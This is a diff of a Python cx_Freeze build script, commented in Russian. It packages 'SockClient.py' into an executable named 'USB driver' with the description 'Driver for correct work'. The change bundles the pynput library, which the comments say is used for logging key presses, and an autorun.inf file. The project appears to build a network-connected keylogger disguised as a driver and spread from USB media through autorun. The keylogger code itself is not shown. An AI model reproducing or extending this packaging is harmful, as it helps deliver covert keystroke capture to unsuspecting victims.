@@ -9,8 +9,6 @@ if __name__ == '__main__':
     ВАЖНО (!)
     Данная библиотека ругалась на импортированную мной pynput для логирования нажатий. Попробовать собрать билд стандартным способом.  
     """
-    #укажем билдеру что нам нужен файл авторана
-    include_files = ["autorun.inf"]
 
     #Проверяем версию ОС, если вин 32 то указываем базу вин32, если нет то по умолчанию 64.
     if sys.platform == "win32":
@@ -18,12 +16,23 @@ if __name__ == '__main__':
     else:
         base = None
 
+    #критически важно было указать pynput напрямую через build_exe_options, иначе сыпались ошибки
+    #важно что бы сам импортируемый модуль был установлен в систеном python интепритаторе он будет браться оттуда
+    #проверять через pip freeze
+    build_exe_options = {
+        "packages": [
+            "pynput"
+        ],
+        "include_files": ["autorun.inf"],
+    }
+
+
     #делаем сетап для билда нашего exe, даем имя, версию и описание произвольно
     #потом говорим что нам надо exe файл (build_exe), который должен включать файлы: include_files
     #далее говорим как назвать файл и с какой базой (32 или 64)
     setup(name="USB driver",
           version="1",
           description="Driver for correct work",
-          options={"build_exe": {"include_files": include_files}},
+          options={"build_exe": build_exe_options},
           executables = [Executable("SockClient.py", base=base)]
           )
